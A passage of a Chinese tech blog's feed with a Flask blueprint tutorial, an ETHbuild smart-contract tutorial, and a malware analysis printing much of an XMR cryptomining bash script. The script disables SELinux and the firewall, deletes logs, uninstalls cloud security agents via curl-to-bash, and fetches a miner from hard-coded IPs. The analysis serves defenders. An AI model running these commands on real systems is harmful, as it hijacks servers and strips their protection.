  </entry>
  
  <entry>
    <title>flask蓝图通俗易懂的理解</title>
    <link href="https://x1a0.net/2021/11/25/flask%E8%93%9D%E5%9B%BE%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://x1a0.net/2021/11/25/flask%E8%93%9D%E5%9B%BE%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E7%90%86%E8%A7%A3/</id>
    <published>2021-11-25T14:33:17.000Z</published>
    <updated>2021-11-25T14:39:36.016Z</updated>
    
    <content type="html"><![CDATA[<p>新建一个<code>test1.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> test2 <span class="keyword">import</span> lantu2</span><br><span class="line"></span><br><span class="line">test1 = Flask(__name__)</span><br><span class="line">test1.register_blueprint(lantu2)</span><br><span class="line"></span><br><span class="line">test1.run(port=<span class="number">5001</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>再建一个<code>test2.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line">lantu2 = Blueprint(<span class="string">&quot;dsfsdfasdfadfasdf&quot;</span>,__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@lantu2.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lantu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xiaoyue&quot;</span></span><br></pre></td></tr></table></figure><p>使用蓝图就是原来app.py多了两行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from 随便一个页面 import 蓝图</span><br><span class="line">app.register_blueprint(蓝图)</span><br></pre></td></tr></table></figure><p>而后蓝图中只要导入Blueprint就和普通app.py一样写路由加功能就行了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;新建一个&lt;code&gt;test1.py&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cl</summary>
      
    
    
    
    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
    
    <category term="Flask" scheme="https://x1a0.net/categories/Flask/"/>
    
    
    <category term="Python" scheme="https://x1a0.net/tags/Python/"/>
    
    <category term="flask" scheme="https://x1a0.net/tags/flask/"/>
    
    <category term="蓝图" scheme="https://x1a0.net/tags/%E8%93%9D%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>ETHbuild-零代码入门合约开发</title>
    <link href="https://x1a0.net/2021/11/15/ETHbuild-%E9%9B%B6%E4%BB%A3%E7%A0%81%E5%85%A5%E9%97%A8%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    <id>https://x1a0.net/2021/11/15/ETHbuild-%E9%9B%B6%E4%BB%A3%E7%A0%81%E5%85%A5%E9%97%A8%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/</id>
    <published>2021-11-15T12:05:45.000Z</published>
    <updated>2021-11-15T13:22:37.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="神奇的sandbox-eth-build"><a href="#神奇的sandbox-eth-build" class="headerlink" title="神奇的sandbox.eth.build"></a>神奇的sandbox.eth.build</h2><p>一个栗子🌰:<br><a href="https://eth.build/build#9279763e02828519b2edf8bdcd035d0961bcea07ed803fb13e3cfd178db9cc2c">「ETHbuild」</a></p><h2 id="使用ganache-cli创建测试链"><a href="#使用ganache-cli创建测试链" class="headerlink" title="使用ganache-cli创建测试链"></a>使用ganache-cli创建测试链</h2><p>如果你有钱或者有足够的时间去跟水龙头要测试币，当然，你可以跳过这个步骤。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ganache-cli</span><br></pre></td></tr></table></figure><p>打开后应该像这样：</p><p><img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.13.19.png"></p><p>如果你没有ganache，那么你可能需要：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cnpm -g install ganache-cli</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">npm -g install ganache-cli</span><br></pre></td></tr></table></figure><h2 id="更改🌰中的chain模块"><a href="#更改🌰中的chain模块" class="headerlink" title="更改🌰中的chain模块"></a>更改🌰中的chain模块</h2><ul><li><p>第一个chain模块在主页，连接着contract的blockchain。  <img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.21.40.png"></p></li><li><p>第二个chain在wallet下 (<strong>双击wallet进入该模块</strong>) ，也可以连接input过来的chain。我在这里测试是否连接链成功。（右边会显示余额）<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.27.30.png"></p></li></ul><h2 id="填入私钥，做一个拥有100ETH的富豪吧！"><a href="#填入私钥，做一个拥有100ETH的富豪吧！" class="headerlink" title="填入私钥，做一个拥有100ETH的富豪吧！"></a>填入私钥，做一个拥有100ETH的富豪吧！</h2><ul><li><p>启动好ganache我们会拥有10个地址，每个地址拥有100个ETH。现在随机选取一个私钥填入wallet下的private key input端口。<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.33.45.png"></p></li><li><p>同样在wallet模块下就能查看到余额了!wow，473288$!<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.35.43.png"></p></li></ul><h2 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h2><ul><li><p>按esc返回到主页面，点击deploy，你应该会发现address发生了改变，因为我们部署了一个新合约。<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.38.30.png"></p></li><li><p>查看当前设置的name和owner，你会发现name = xiaoyue,owner = 0x000000···。不过没关系，接下来我们可以更改他们。</p></li></ul><h2 id="设置我们自己的名字和地址！"><a href="#设置我们自己的名字和地址！" class="headerlink" title="设置我们自己的名字和地址！"></a>设置我们自己的名字和地址！</h2><ul><li><p>在text中填入我们自己的名字，比如我的另一个名字balala。点击旁边的click me之后会发现transaction的output端口已经将我们的交易信息打出来了，这预示着我们可能更名成功<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.45.14.png"></p></li><li><p>而在旁边我们调用set_owner函数，并向他转了0个eth。这时合约会记录我们的地址，并自动设置到owner变量中。<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.50.28.png"></p></li></ul><h2 id="查看我们更改后的name-and-owner"><a href="#查看我们更改后的name-and-owner" class="headerlink" title="查看我们更改后的name and owner"></a>查看我们更改后的name and owner</h2><p>显然，更改成功了~✿✿ヽ(°▽°)ノ✿</p><p><img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.53.00.png"></p><h2 id="两个小tips"><a href="#两个小tips" class="headerlink" title="两个小tips"></a>两个小tips</h2><ol><li><p>在重新打开别人的项目或者自己给项目添加title后，module中的连接线会断开！如果你发现这个🌰运行不起来，不妨打开wallet和deploy模块查看input的连接线是否断开。</p></li><li><p>鼠标单机一个空白地方，按空格就能快速找到你要的模块了！</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;神奇的sandbox-eth-build&quot;&gt;&lt;a href=&quot;#神奇的sandbox-eth-build&quot; class=&quot;headerlink&quot; title=&quot;神奇的sandbox.eth.build&quot;&gt;&lt;/a&gt;神奇的sandbox.eth.build&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="区块链" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="ethbuild" scheme="https://x1a0.net/tags/ethbuild/"/>
    
  </entry>
  
  <entry>
    <title>xmr挖矿脚本分析</title>
    <link href="https://x1a0.net/2021/11/10/xmr%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://x1a0.net/2021/11/10/xmr%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-11-10T07:23:35.000Z</published>
    <updated>2021-11-10T07:30:15.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="门罗币xmrig挖矿病毒分析"><a href="#门罗币xmrig挖矿病毒分析" class="headerlink" title="门罗币xmrig挖矿病毒分析"></a>门罗币xmrig挖矿病毒分析</h1><p>起因是队里老师的服务器中招了，不过是在docker里面，阿里云盾的误报。权限给的小，就没去处理。这里分析下这个脚本的逻辑。希望大家再次中招的时候不会这么懵。</p><p>这个挖矿脚本明显是通过之前的几个版本的病毒魔改的，还是Redis未授权漏洞。病毒会通过感染主机设置了免密登录的其他主机，并进行Redis数据库未授权访问漏洞的扫描。</p><p>因为最近比赛很多，有空再写处置方法。哈哈，鸽鸽。</p><hr><p>获取当前ip地址信息<br>sed全局替换(/g)将”,”替换为”\n”<br>grep不区分大小写判断是否含有CN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> curl http://ip-api.com/json/ | sed <span class="string">&#x27;s/,/\n/g&#x27;</span> | grep  -i <span class="string">&#x27;CN&#x27;</span>; <span class="keyword">then</span> </span><br><span class="line">    <span class="built_in">exit</span> 1 </span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Linux下的安全子系统关闭，并且将错误输出到黑洞</p><p><a href="https://baike.baidu.com/item/SELinux/8865268?fr=aladdin">Selinux</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0 2&gt;dev/null</span><br><span class="line"><span class="built_in">echo</span> SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>清理缓存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sync &amp;&amp; <span class="built_in">echo</span> 3 &gt;/proc/sys/vm/dro</span><br></pre></td></tr></table></figure><p>更改了一些系统命令名称，定义了一些变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">crondir=<span class="string">&#x27;/var/spool/cron/&#x27;</span><span class="string">&quot;<span class="variable">$USER</span>&quot;</span></span><br><span class="line">cont=`cat <span class="variable">$&#123;crondir&#125;</span>`</span><br><span class="line">ssht=`cat /root/.ssh/authorized_keys`</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /etc/zzhs</span><br><span class="line">rtdir=<span class="string">&quot;/etc/zzhs&quot;</span></span><br><span class="line">bbdir=<span class="string">&quot;/usr/bin/curl&quot;</span></span><br><span class="line">bbdira=<span class="string">&quot;/usr/bin/cd1&quot;</span></span><br><span class="line">ccdir=<span class="string">&quot;/usr/bin/wget&quot;</span></span><br><span class="line">ccdira=<span class="string">&quot;/usr/bin/wd1&quot;</span></span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cd1</span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wd1</span><br></pre></td></tr></table></figure><p>修改最大文件限制数</p><p>删除日志文件</p><p>给目录上锁</p><p>关闭防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -n 65535</span><br><span class="line">rm -rf /var/<span class="built_in">log</span>/syslog</span><br><span class="line">chattr -iua /tmp/</span><br><span class="line">chattr -iua /var/tmp/</span><br><span class="line">ufw <span class="built_in">disable</span></span><br><span class="line">iptables -F</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关闭系统监视</p><p>删掉了两个账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sudo sysctl kernel.nmi_watchdog=0</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;0&#x27;</span> &gt;/proc/sys/kernel/nmi_watchdog</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;kernel.nmi_watchdog=0&#x27;</span> &gt;&gt;/etc/sysctl.conf</span><br><span class="line">userdel akay</span><br><span class="line">userdel vfinder</span><br><span class="line">rm -rf /tmp/addres*</span><br><span class="line">rm -rf /tmp/walle*</span><br><span class="line">rm -rf /tmp/keys</span><br></pre></td></tr></table></figure><p>卸载阿里云盾和腾讯的云镜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ps aux | grep -i <span class="string">&#x27;[a]liyun&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  pkill aliyun-service</span><br><span class="line">  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span><br><span class="line">  rm -rf /usr/<span class="built_in">local</span>/aegis*</span><br><span class="line">  systemctl stop aliyun.service</span><br><span class="line">  systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">  service bcm-agent stop</span><br><span class="line">  yum remove bcm-agent -y</span><br><span class="line">  apt-get remove bcm-agent -y</span><br><span class="line"><span class="keyword">elif</span> ps aux | grep -i <span class="string">&#x27;[y]unjing&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/YunJing/uninst.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>定义远程文件地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">miner_url=<span class="string">&quot;http://106.15.74.113/b2f628/zzh&quot;</span></span><br><span class="line">miner_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/zzh&quot;</span></span><br><span class="line">miner_size=<span class="string">&quot;7600464&quot;</span></span><br><span class="line">sh_url=<span class="string">&quot;https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexni.png&quot;</span></span><br><span class="line">sh_url_backup=<span class="string">&quot;https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexni.png&quot;</span></span><br><span class="line">config_url=<span class="string">&quot;http://106.15.74.113/b2f628/config.json&quot;</span></span><br><span class="line">config_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/config.json&quot;</span></span><br><span class="line">config_size=<span class="string">&quot;2752&quot;</span></span><br><span class="line">chattr_size=<span class="string">&quot;8000&quot;</span></span><br><span class="line">rm -f /tmp/.null 2&gt;/dev/null</span><br><span class="line"><span class="built_in">echo</span> 128 &gt; /proc/sys/vm/nr_hugepages</span><br><span class="line">sysctl -w vm.nr_hugepages=128</span><br></pre></td></tr></table></figure><p>删除同类挖矿病毒，很长，省略了些。</p><p>需要病毒样本研究的可以从这拿：<a href="https://github.com/xiaoyue2019/Xmrig-mining-virus-samples">https://github.com/xiaoyue2019/Xmrig-mining-virus-samples</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="title">kill_miner_proc</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">netstat -anp | grep 185.71.65.238 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep 140.82.52.87 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :23 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :143 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :2222 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3333 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3389 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :5555 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6666 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6665 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6667 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :7777 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :8444 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3347 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:3333&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:5555&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kworker -c\&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;log_&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;systemten&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;netns&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;voltuned&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;darwin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/dl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ddg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/pprt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ppol&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/65ccE*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/jmx*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/2Ne80*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;IOFoqIgyC0zmf2UR&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;45.76.122.92&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.38.191.178&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.15.56.161&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;86s.jpg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aGTSGJJp&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span 